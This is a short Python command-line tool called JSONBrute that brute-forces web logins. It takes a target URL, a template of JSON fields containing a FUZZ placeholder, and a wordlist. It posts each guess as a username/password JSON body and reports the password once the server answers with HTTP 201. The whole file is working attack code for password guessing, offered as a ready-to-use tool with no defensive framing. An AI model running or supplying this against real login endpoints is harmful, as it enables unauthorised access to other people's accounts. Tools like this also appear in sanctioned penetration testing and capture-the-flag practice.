#!/usr/bin/python3

import argparse
import requests
from json import loads
import sys

parser = argparse.ArgumentParser(description="A simple JSON bruteforce tool.")
parser.add_argument("--url", type=str, required=True, help="The URL to post the data to.")
parser.add_argument("--data", type=str, required=True, help="The JSON data to post.")
parser.add_argument("--wordlist", type=str, required=True, help="The wordlist to use to fuzz.")
args = parser.parse_args()


class logger:
    def __init__(self):
        self.blue = '\033[94m'
        self.green = '\033[92m'
        self.yellow = '\033[93m'
        self.red = '\033[91m'
        self.end = '\033[0m'

    def info(self, message):
        print(f"{self.blue}[*]{self.end} {message}")

    def success(self, message):
        print(f"{self.green}[+]{self.end} {message}")

    def warning(self, message):
        print(f"{self.yellow}[!]{self.end} {message}")

    def error(self, message):
        print(f"{self.red}[-]{self.end} {message}")


log = logger()


def getWordlist(file):
    with open(file) as data:
        wordlist = data.read().splitlines()
        return wordlist


def getJSON(data):
    json = data.split(",")
    json = [pair.strip().split("=") for pair in json]

    json = {key: value for [key, value] in json}

    return str(json)


if __name__ == "__main__":
    log.info(f"Starting JSONBrute on {args.url}")

    wordlist = getWordlist(args.wordlist)

    for entry in wordlist:
        try:
            headers = {
                "Content-Type": "application/json"
            }
            json = getJSON(args.data)
            json = json.replace("FUZZ", entry)
            json = json.replace("'", "\"")
            json = loads(json)

            username = json["username"]
            password = json["password"]

            request = requests.post(args.url, headers=headers, json=json)

            if request.status_code != 201:
                pass
            else:
                log.success(f"Password for user {username} found: {password}")
                sys.exit()
        except requests.ConnectionError:
            log.error(f"Failed to connect to {args.url}")
            sys.exit()
    else:
        log.warning(f"Password for user {username} not found")
